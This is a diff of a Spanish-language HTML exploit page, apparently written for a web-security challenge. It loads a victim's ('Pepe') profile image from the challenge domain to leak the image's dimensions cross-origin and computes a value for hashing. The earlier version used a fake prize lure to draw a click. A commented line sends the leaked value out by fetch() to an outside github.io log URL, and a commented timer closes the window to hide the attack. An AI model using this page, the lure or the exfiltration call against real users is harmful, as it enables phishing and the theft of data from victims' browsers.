@@ -1,56 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>¡Felicidades, ganaste algo!</title>
+    <title>¡Procesando su solicitud!</title>
     <meta charset="UTF-8">
 </head>
 <body>
 
-    <h1>🎉 ¡Has sido seleccionado para un premio! 🎉</h1>
-    <p>Solo haz clic en el botón para reclamarlo y vuelve a la pestaña anterior.</p>
-    <button onclick="cerrarVentana()">Reclamar mi premio</button>
+    <h1>⌛ Procesando su solicitud... Por favor espere. ⌛</h1>
+    <p>Este sitio cargará su perfil de usuario en unos segundos y luego se cerrará automáticamente.</p>
+    
+    <div id="log"></div>
 
     <script>
+        // Función para agregar mensajes al log en la página
+        function logMessage(msg, type = 'info') {
+            const logDiv = document.getElementById('log');
+            const color = type === 'success' ? 'green' : type === 'error' ? 'red' : 'blue';
+            logDiv.innerHTML += `<p style="color: ${color}; margin: 5px 0;">[${new Date().toLocaleTimeString()}] ${msg}</p>`;
+        }
+
+        logMessage("Inicio de script. Intentando cargar la imagen de Pepe...");
+
+        // Dominio del desafío (Tu URL es de HTTPS)
         const DOMINIO_DESAFIO = "https://chl-0be918a6-5b4f-4de5-b30a-669e10a3cf51-imagen-importante.softwareseguro.com.ar";
-        const URL_IMAGEN = DOMINIO_DESAFIO + "/profile-pic";
+        
+        // URL de la imagen de Pepe
+        const URL_IMAGEN = DOMINIO_DESAFIO + "/profile-pic"; 
         
         // 1. Crear un elemento de imagen oculto
         const img = new Image();
-        // Intentar forzar el modo CORS anónimo. Esto es necesario si el servidor del desafío 
-        // no tiene cabeceras CORS, pero puede fallar si la configuración es estricta.
-        img.crossOrigin = "anonymous"; 
+        img.crossOrigin = "anonymous"; // Se mantiene el intento de forzar CORS, aunque puede fallar.
         
         // 2. Definir lo que haremos cuando la imagen cargue
         img.onload = function() {
-            // Obtener las dimensiones originales (naturales) de la imagen
+            logMessage("La imagen parece haber cargado.", 'info');
+            
+            // Obtener las dimensiones originales (naturales)
             const ancho = img.naturalWidth;
             const alto = img.naturalHeight;
-
-            // Calcular el Nivel de Privilegio: ancho x alto
             const nivel = ancho * alto;
 
-            // 3. Mostrar el resultado
-            let resultado = `✅ Imagen Cargada: ${ancho}x${alto} píxeles.`;
-            resultado += `<br>✅ Nivel de Pepe: ${nivel}`;
-            resultado += `<br>🚨 **HASH MD5 requerido de:** ${nivel}`;
+            // ⚠️ VERIFICACIÓN CRÍTICA:
+            // Si ancho y alto son 0, 1, o el tamaño de la imagen de error, la lectura falló por SOP.
+            if (ancho <= 1 || alto <= 1 || nivel === 0) {
+                 logMessage(`❌ FALLA DE LECTURA (SOP): Ancho=${ancho}px, Alto=${alto}px. Dimensiones no válidas. El navegador bloqueó la lectura del tamaño.`, 'error');
+            } else {
+                 // 3. Éxito: Mostrar y reportar el resultado
+                logMessage(`✅ ÉXITO DE LECTURA: ${ancho}x${alto} píxeles.`, 'success');
+                logMessage(`✅ Nivel de Pepe: ${nivel}`, 'success');
+                logMessage(`🚨 HASH MD5 requerido de: ${nivel}`, 'success');
 
-            document.body.innerHTML += `<p style="color: red; font-weight: bold;">${resultado}</p>`;
+                // En un ataque real, el envío automático de datos sería aquí:
+                // fetch('https://josebaigorria.github.io/desafio-pepe/log.html?level=' + nivel);
+            }
+
+            // Opcional: Cerrar la ventana automáticamente (para simular un ataque limpio)
+            // setTimeout(() => { window.close(); }, 5000); // Cierra después de 5 segundos
+
         };
         
         img.onerror = function() {
-            // Manejo de error: Falla de carga o bloqueo por la Política de Mismo Origen (SOP).
-            // Si ves este error, el desafío podría requerir otra técnica (como XSS en el sitio principal)
-            document.body.innerHTML += "<p style='color: orange; font-weight: bold;'>⚠️ Error al cargar la imagen. Es posible que el navegador de Pepe esté bloqueando el acceso a las dimensiones por seguridad (SOP).</p>";
+            // El onerror se dispara si la URL de la imagen es incorrecta o el servidor la rechaza.
+            logMessage(`❌ ERROR FATAL: No se pudo cargar la imagen desde ${URL_IMAGEN}. Revisa la ruta '/profile-pic'.`, 'error');
         };
 
-        // 4. Iniciar la carga de la imagen
+        // 4. Iniciar la carga de la imagen (Se ejecuta inmediatamente al abrir la página)
         img.src = URL_IMAGEN;
-
-        // Función para cerrar la pestaña y dar la ilusión de "ataque completado"
-        function cerrarVentana() {
-            window.close();
-            alert("¡Premio reclamado! Vuelve a la pestaña anterior.");
-        }
     </script>
 </body>
 </html>
